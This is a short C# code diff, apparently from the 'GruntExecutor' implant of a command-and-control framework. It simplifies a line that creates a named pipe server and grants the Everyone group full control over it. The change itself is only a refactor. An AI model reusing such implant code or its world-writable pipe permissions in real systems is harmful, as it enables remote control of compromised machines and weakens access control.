@@ -9,6 +9,7 @@ using System.Threading;
 using System.Reflection;
 using System.Collections.Generic;
 using System.Security.Principal;
+using System.Security.AccessControl;
 using System.Security.Cryptography;
 using System.Text.RegularExpressions;
 
@@ -477,8 +478,7 @@ namespace GruntExecutor
                     try
                     {
                         PipeSecurity ps = new PipeSecurity();
-                        System.Security.Principal.SecurityIdentifier sid = new System.Security.Principal.SecurityIdentifier(System.Security.Principal.WellKnownSidType.WorldSid, null);
-                        ps.AddAccessRule(new PipeAccessRule(sid, PipeAccessRights.FullControl, System.Security.AccessControl.AccessControlType.Allow));
+                        ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
                         NamedPipeServerStream newServerPipe = new NamedPipeServerStream(this.PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
                         newServerPipe.WaitForConnection();
                         lock (this._WritePipeLock)
